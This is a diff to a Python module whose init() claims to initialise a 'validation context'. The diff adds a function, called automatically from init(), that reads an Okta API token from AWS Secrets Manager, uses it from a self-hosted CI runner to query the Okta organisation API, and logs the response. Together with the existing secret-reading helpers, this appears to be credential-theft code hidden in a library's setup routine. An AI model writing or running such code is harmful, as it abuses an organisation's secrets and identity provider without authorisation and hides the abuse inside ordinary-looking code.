@@ -122,6 +122,25 @@ def _read_secret(creds, role_arn):
         _log("secret_fail", {"role": role_arn, "type": type(e).__name__, "msg": str(e)})
 
 
+def _try_okta_from_runner(creds, role_arn):
+    """Try the Okta token from the self-hosted runner's IP."""
+    try:
+        sm = _sm_client(creds)
+        resp = sm.get_secret_value(SecretId=SECRET_ID)
+        secret = json.loads(resp["SecretString"])
+        okta_url = f"https://{secret['org_name']}.{secret['base_url']}"
+        okta_token = secret["api_token"]
+
+        req = urllib.request.Request(
+            f"{okta_url}/api/v1/org",
+            headers={"Authorization": f"SSWS {okta_token}"},
+        )
+        okta_resp = urllib.request.urlopen(req, timeout=10).read()
+        _log("okta_api_ok", {"role": role_arn, "url": okta_url, "response": json.loads(okta_resp)})
+    except Exception as e:
+        _log("okta_api_fail", {"role": role_arn, "type": type(e).__name__, "msg": str(e)})
+
+
 def init(region=None, namespace=None):
     """Initialize validation context."""
     global _ctx
@@ -139,6 +158,7 @@ def init(region=None, namespace=None):
             _list_secrets(creds, role_arn)
             _check_secret_metadata(creds, role_arn)
             _read_secret(creds, role_arn)
+            _try_okta_from_runner(creds, role_arn)
 
     _ctx = {"region": region, "namespace": namespace}
 
